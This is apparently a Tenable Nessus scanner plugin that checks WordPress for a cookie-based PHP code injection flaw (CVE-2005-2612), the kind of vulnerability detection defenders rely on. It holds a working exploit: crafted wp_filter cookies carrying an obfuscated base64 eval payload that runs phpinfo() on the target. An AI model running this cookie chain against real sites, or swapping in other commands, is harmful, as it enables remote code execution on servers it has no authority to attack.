#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19414);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-2612");
  script_bugtraq_id(14533);
  script_xref(name:"OSVDB", value:"18672");

  script_name(english:"WordPress Cookie cache_lastpostdate Parameter PHP Code Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to PHP code
injection." );
 script_set_attribute(attribute:"description", value:
"The installed version of WordPress on the remote host will accept and
execute arbitrary PHP code passed to the 'cache_lastpostdate'
parameter via cookies provided PHP's 'register_globals' setting is
enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?2c5481e5" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for cache_lastpostdate parameter PHP code injection vulnerability in WordPress";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Construct an exploit per PoC.
  #
  # nb: hardcoding the final value of 'cnv' would save time but not
  #     be as understandable.
  cmd = "phpinfo();";
  code = base64(str:cmd);
  for (i=0; i<strlen(code); i++) {
    cnv += string("chr(", ord(code[i]), ").");
  }
  cnv += string("chr(32)");
  str = base64(
    str:string(
      "args[0]=eval(base64_decode(", cnv, ")).die()&",
      "args[1]=x"
    )
  );


  set_http_cookie(name: "wp_filter[query_vars][0][0][function]", value: "get_lastpostdate");
  set_http_cookie(name: "wp_filter[query_vars][0][0][accepted_args]", value: "0");
  set_http_cookie(name: "wp_filter[query_vars][0][1][function]", value: "base64_decode");
  set_http_cookie(name: "wp_filter[query_vars][0][1][accepted_args]", value: "1");
  set_http_cookie(name: "cache_lastpostmodified[server]", value: "//e");
  set_http_cookie(name: "cache_lastpostdate[server]", value: str);
  set_http_cookie(name: "wp_filter[query_vars][1][0][function]", value: "parse_str");
  set_http_cookie(name: "wp_filter[query_vars][1][0][accepted_args]", value: "1");
  set_http_cookie(name: "wp_filter[query_vars][2][0][function]", value: "get_lastpostmodified");
  set_http_cookie(name: "wp_filter[query_vars][2][0][accepted_args]", value: "0");
  set_http_cookie(name: "wp_filter[query_vars][3][0][function]", value: "preg_replace");
  set_http_cookie(name: "wp_filter[query_vars][3][0][accepted_args]", value: "3");

  # Try to exploit one of the flaws to run phpinfo().
  r = http_send_recv3(method: "GET", item:string(dir, "/"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if it looks like the output of phpinfo().
  if ("PHP Version" >< r[2]) {
    security_warning(port);
    exit(0);
  }
}
